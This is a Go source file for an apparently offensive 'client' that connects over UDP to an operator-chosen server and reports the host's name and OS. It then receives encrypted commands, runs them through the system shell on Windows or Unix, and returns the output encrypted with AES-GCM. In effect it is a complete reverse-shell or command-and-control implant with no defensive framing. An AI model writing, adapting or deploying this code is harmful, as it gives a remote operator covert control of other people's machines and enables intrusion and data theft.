// Advanced Client with command execution
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func EncryptStringGCM(key []byte, plaintext string) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	// Never use more than 2^32 random nonces with a given key because of the risk of repeat
	nonce := make([]byte, 12)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ciphertext := aesgcm.Seal(nil, nonce, []byte(plaintext), nil)

	// Prepend the nonce to the ciphertext
	encryptedMsg := make([]byte, len(nonce)+len(ciphertext))
	copy(encryptedMsg[:12], nonce)
	copy(encryptedMsg[12:], ciphertext)

	return base64.URLEncoding.EncodeToString(encryptedMsg), nil
}

func GenerateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" // Define the characters to be used
	var result string
	for i := 0; i < length; i++ {
		randomIndex, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		result += string(charset[randomIndex.Int64()])
	}
	return result
}

func DecryptStringGCM(key []byte, ciphertext string) (string, error) {
	data, err := base64.URLEncoding.DecodeString(ciphertext)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	if len(data) < 12 {
		return "", errors.New("ciphertext too short")
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := data[:12]
	ciphertextBytes := data[12:]

	plaintext, err := aesgcm.Open(nil, nonce, ciphertextBytes, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func encOutput(input []byte) string {
	// Create a random key for encryption
	key := []byte(GenerateRandomString(16))
	// Encrypt the response before sending
	encResponse, err := EncryptStringGCM(key, string(input))
	if err != nil {
		encMessage := fmt.Sprintf("Error encrypting response: %v\n", err)
		return encMessage
	}
	encMessage := fmt.Sprintf("%s.%s", key, encResponse)
	return encMessage
}

func decInput(input string) string {
	parts := strings.SplitN(input, ".", 2)
	if len(parts) != 2 {
		return fmt.Sprintf("Invalid message format: %s\n", input)
	}

	keyReceived := []byte(parts[0])
	encMessage := parts[1]

	message, err := DecryptStringGCM(keyReceived, encMessage)
	if err != nil {
		return fmt.Sprintf("Error decrypting command: %v\n", err)
	}
	return message
}

func main() {
	ip := flag.String("ip", "0.0.0.0", "IP address to listen on")
	port := flag.String("port", "8080", "Port to listen on")
	bufsize := flag.Int("bufsize", 16384, "Buffer size for UDP packets")
	flag.Parse()

	serverIP := *ip
	serverPort := *port
	serverAddr := serverIP + ":" + serverPort

	udpAddr, err := net.ResolveUDPAddr("udp", serverAddr)
	if err != nil {
		fmt.Printf("Error resolving address: %v\n", err)
		return
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		fmt.Printf("Error connecting: %v\n", err)
		return
	}
	defer conn.Close()

	// Send system info
	hostname, _ := os.Hostname()
	conn.Write([]byte(fmt.Sprintf("Connected: %s (%s)", hostname, runtime.GOOS)))

	for {
		buffer := make([]byte, *bufsize)
		n, _, err := conn.ReadFromUDP(buffer)
		if err != nil {
			fmt.Printf("Error reading: %v\n", err)
			return
		}

		messageSent := strings.TrimSpace(string(buffer[:n]))
		command := decInput(messageSent)
		if command == "exit" {
			fmt.Println("Exiting...")
			return
		}

		// Execute command
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/c", command)
		} else {
			cmd = exec.Command("sh", "-c", command)
		}

		output, err := cmd.CombinedOutput()
		if err != nil {
			response := fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
			encResponse := encOutput([]byte(response))
			// Send the key and encrypted response together
			conn.Write([]byte(encResponse))
		} else {
			encResponse := encOutput([]byte(output))
			// Send the key and encrypted response together
			conn.Write([]byte(encResponse))
		}
	}
}
